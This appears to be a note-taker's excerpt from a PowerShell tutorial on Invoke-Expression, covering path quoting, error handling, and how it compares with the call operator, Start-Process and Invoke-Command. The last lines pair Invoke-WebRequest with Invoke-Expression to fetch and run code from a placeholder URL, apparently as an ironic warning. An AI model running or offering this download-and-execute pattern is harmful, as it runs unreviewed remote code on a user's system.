
https://adamtheautomator.com/invoke-expression/

#Run a PowerShell command via Invoke-Expression
$Command = 'Get-Process'
Invoke-Expression -Command $Command 

#Execute a script via Invoke-Expression
$MyScript = '.\MyScript.ps1'
Invoke-Expression -Command $MyScript
Invoke-Command -ComputerName $server -FilePath $loopbackScript ` ????

#Don't work
$MyScript = "C:\Folder Path\MyScript.ps1"
$MyScript = "'C:\Folder Path\MyScript.ps1'"
Invoke-Expression $MyScript

#Works
$MyScript = "C:\'Folder Path'\MyScript.ps1"
Invoke-Expression $MyScript

PS51> & 'C:\Scripts\MyScript.ps1' -Path 'C:\file.txt' -Force 

$filePath = 'C:\Scripts\MyScript.ps1'
$params = '-Path "C:\file.txt" -Force'
Invoke-Expression "$filePath $params"
# or
$string = 'C:\Scripts\MyScript.ps1 -Path "C:\file.txt" -Force'
Invoke-Expression $string

Invoke-Command -ComputerName $server -filePath $upgradeScript ` # ?????
  -ArgumentList $debug -Credential $creds.Setup -Authentication Credssp 


 #Doesn't work - Invoke-Expression doesn't act as a global error handler!
try{
    $Command = 'Get-Process powerhell'
    Invoke-Expression $Command -ErrorAction Stop
} catch {
    Write-Host "Oops, something went wrong!"
}

What’s the difference between Invoke-Expression and the " call operator"  (&)?
The call operator (&) is great to quickly run a command, script, or script block. 
However, the call operator does not parse the command. 
It cannot interpret command parameters as Invoke-Expression can.

For example, perhaps I’d like to get the PowerShell Core process using 
the Get-Process cmdlet usin the code Get-Process -ProcessName pwsh. 
Concatenating Get-Process and the parameter will not work as expected using the call operator.
$a = "Get-Process"
## Doesn't work
& "$a pwsh"
But if you execute this string with Invoke-Expression, it will work as expected.
Invoke-Expression "$a pwsh"

What’s the difference between Invoke-Expression and Start-Process?
The Start-Process cmdlet provides a return or exit code in the returned object. It allows you to wait for the called process to complete and allows you to launch a process under a different Windows credential. Invoke-Expression is quick and dirty whereas Start-Process can be more useful for interpreting results of the executed process.


What’s the difference between Invoke-Expression and Invoke-Command?
Invoke-Expression only “converts” a string to executable code. 
Invoke-Command, on the other hand, leverages PowerShell Remoting giving you 
the ability to invoke code locally or remotely on computers.
Invoke-Command is preferable if you are writing the executed commands now, 
as you retain intellisense in your IDE whereas 
Invoke-Expression would be preferable if you wanted to call another script from within your current one.

Example:
#These both work the same way, but we lost our intellisense with the Invoke-Expression example.
Invoke-Command -ScriptBlock {
    Get-Process Chrome
    Get-Process Powershell
}
Invoke-Expression -Command "
Get-Process Chrome
Get-Process Powershell
"

$Command = "(Invoke-Webrequest -Uri `"http://website.com/CompletelySafeCode`").Content"
Invoke-Expression $Command

